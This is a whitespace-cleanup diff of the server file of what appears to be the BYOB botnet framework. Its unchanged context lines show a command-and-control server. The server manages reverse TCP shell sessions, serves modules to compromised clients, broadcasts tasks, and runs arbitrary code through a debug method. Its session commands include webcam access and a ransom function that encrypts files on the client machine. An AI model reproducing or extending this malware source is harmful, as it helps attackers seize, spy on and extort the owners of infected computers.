@@ -48,7 +48,7 @@ except NameError:
 __threads = {}
 __abort = False
 __debug = False
-__banner__ = """ 
+__banner__ = """
 
 88                                  88
 88                                  88
@@ -118,7 +118,7 @@ def main():
 
     modules = os.path.abspath('modules')
     site_packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'] if len([os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']) else [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if 'local' not in _ if os.path.basename(_) == 'dist-packages']
-        
+
     if len(site_packages):
         n = 0
         globals()['packages'] = site_packages[0]
@@ -147,13 +147,13 @@ def main():
 
 
 class C2():
-    """ 
+    """
     Console-based command & control server with a streamlined user-interface for controlling clients
     with reverse TCP shells which provide direct terminal access to the client host machines, as well
     as handling session authentication & management, serving up any scripts/modules/packages requested
     by clients to remotely import them, issuing tasks assigned by the user to any/all clients, handling
     incoming completed tasks from clients
-    
+
     """
 
     _lock = threading.Lock()
@@ -163,7 +163,7 @@ class C2():
     _prompt_style = 'BRIGHT'
 
     def __init__(self, host='0.0.0.0', port=1337, db=':memory:'):
-        """ 
+        """
         Create a new Command & Control server
 
         `Optional`
@@ -172,7 +172,7 @@ class C2():
                                 *.db     (persistent)
 
         Returns a byob.server.C2 instance
-        
+
         """
         self._active = threading.Event()
         self._count = 1
@@ -331,12 +331,12 @@ class C2():
             return raw_input(getattr(colorama.Fore, self._prompt_color) + getattr(colorama.Style, self._prompt_style) + data.rstrip())
 
     def debug(self, code):
-        """ 
+        """
         Execute code directly in the context of the currently running process
 
         `Requires`
         :param str code:    Python code to execute
-        
+
         """
         if globals()['debug']:
             try:
@@ -347,9 +347,9 @@ class C2():
             util.log("Debugging mode is disabled")
 
     def quit(self):
-        """ 
+        """
         Quit server and optionally keep clients alive
-        
+
         """
         globals()['package_handler'].terminate()
         globals()['module_handler'].terminate()
@@ -368,12 +368,12 @@ class C2():
         sys.exit(0)
 
     def help(self, info=None):
-        """ 
+        """
         Show usage information
 
         `Optional`
         :param dict info:   client usage help
-        
+
         """
         column1 = 'command <arg>'
         column2 = 'description'
@@ -387,7 +387,7 @@ class C2():
         util.display("\n", end=',')
 
     def display(self, info):
-        """ 
+        """
         Display formatted output in the console
 
         `Required`
@@ -414,7 +414,7 @@ class C2():
             print()
 
     def query(self, statement):
-        """ 
+        """
         Query the database
 
         `Requires`
@@ -426,7 +426,7 @@ class C2():
     def settings(self):
         """
         Show the server's currently configured settings
-        
+
         """
         text_color = [color for color in filter(str.isupper, dir(colorama.Fore)) if color == self._text_color][0]
         text_style = [style for style in filter(str.isupper, dir(colorama.Style)) if style == self._text_style][0]
@@ -441,7 +441,7 @@ class C2():
         util.display('True\n' if globals()['debug'] else 'False\n', color='green' if globals()['debug'] else 'red', style='normal')
 
     def set(self, args=None):
-        """ 
+        """
         Set display settings for the command & control console
 
         Usage: `set [setting] [option]=[value]`
@@ -500,12 +500,12 @@ class C2():
         util.display("\nusage: set [setting] [option]=[value]\n\n    colors:   white/black/red/yellow/green/cyan/magenta\n    styles:   dim/normal/bright\n", color=self._text_color, style=self._text_style)
 
     def task_list(self, id=None):
-        """ 
+        """
         List client tasks and results
 
         `Requires`
         :param int id:   session ID
-        
+
         """
         if globals()['debug']:
             util.display('parent={} , child={} , args={}'.format(inspect.stack()[1][3], inspect.stack()[0][3], locals()))
@@ -515,11 +515,11 @@ class C2():
             print()
             for task in tasks:
                 util.display(tasks.index(task) + 1)
-                self.database._display(task)        
+                self.database._display(task)
             print()
 
     def task_broadcast(self, command):
-        """ 
+        """
         Broadcast a task to all sessions
 
         `Requires`
@@ -539,7 +539,7 @@ class C2():
         self._return()
 
     def session_webcam(self, args=''):
-        """ 
+        """
         Interact with a client webcam
 
         `Optional`
@@ -599,7 +599,7 @@ class C2():
         return result
 
     def session_remove(self, session_id):
-        """ 
+        """
         Shutdown client shell and remove client from database
 
         `Requires`
@@ -649,7 +649,7 @@ class C2():
                 return self.run()
 
     def session_list(self, verbose=True):
-        """ 
+        """
         List currently online clients
 
         `Optional`
@@ -666,7 +666,7 @@ class C2():
             print()
 
     def session_ransom(self, args=None):
-        """ 
+        """
         Encrypt and ransom files on client machine
 
         `Required`
@@ -684,7 +684,7 @@ class C2():
             util.log("No client selected")
 
     def session_shell(self, session):
-        """ 
+        """
         Interact with a client session through a reverse TCP shell
 
         `Requires`
@@ -707,7 +707,7 @@ class C2():
             return self.current_session.run()
 
     def session_background(self, session=None):
-        """ 
+        """
         Send a session to background
 
         `Requires`
@@ -770,7 +770,7 @@ class C2():
 
     @util.threaded
     def serve_resources(self):
-        """ 
+        """
         Handles serving modules and packages in a seperate thread
 
         """
@@ -781,7 +781,7 @@ class C2():
             globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
 
     def run(self):
-        """ 
+        """
         Run C2 server administration terminal
 
         """
@@ -824,16 +824,16 @@ class C2():
 
 
 class Session(threading.Thread):
-    """ 
+    """
     A subclass of threading.Thread that is designed to handle an
-    incoming connection by creating an new authenticated session 
+    incoming connection by creating an new authenticated session
     for the encrypted connection of the reverse TCP shell
 
     """
 
     def __init__(self, connection=None, id=1):
         """
-        Create a new Session 
+        Create a new Session
 
         `Requires`
         :param connection:  socket.socket object
@@ -860,7 +860,7 @@ class Session(threading.Thread):
             return
 
     def kill(self):
-        """ 
+        """
         Kill the reverse TCP shell session
 
         """
@@ -874,7 +874,7 @@ class Session(threading.Thread):
         """
         Get information about the client host machine
         to identify the session
-        
+
         """
         header_size = struct.calcsize("!L")
         header = self.connection.recv(header_size)
@@ -885,9 +885,9 @@ class Session(threading.Thread):
         return info
 
     def status(self):
-        """ 
+        """
         Check the status and duration of the session
-        
+
         """
         c = time.time() - float(self._created)
         data = ['{} days'.format(int(c / 86400.0)) if int(c / 86400.0) else str(),
@@ -897,7 +897,7 @@ class Session(threading.Thread):
         return ', '.join([i for i in data if i])
 
     def send_task(self, task):
-        """ 
+        """
         Send task results to the server
 
         `Requires`
@@ -922,7 +922,7 @@ class Session(threading.Thread):
         return True
 
     def recv_task(self):
-        """ 
+        """
         Receive and decrypt incoming task from server
 
         :returns dict task:
@@ -934,7 +934,7 @@ class Session(threading.Thread):
           :attr datetime completed:  time task was completed by client
 
         """
-        
+
         header_size = struct.calcsize('!L')
         header = self.connection.recv(header_size)
         if len(header) == 4:
@@ -947,7 +947,7 @@ class Session(threading.Thread):
             return 0
 
     def run(self):
-        """ 
+        """
         Handle the server-side of the session's reverse TCP shell
 
         """
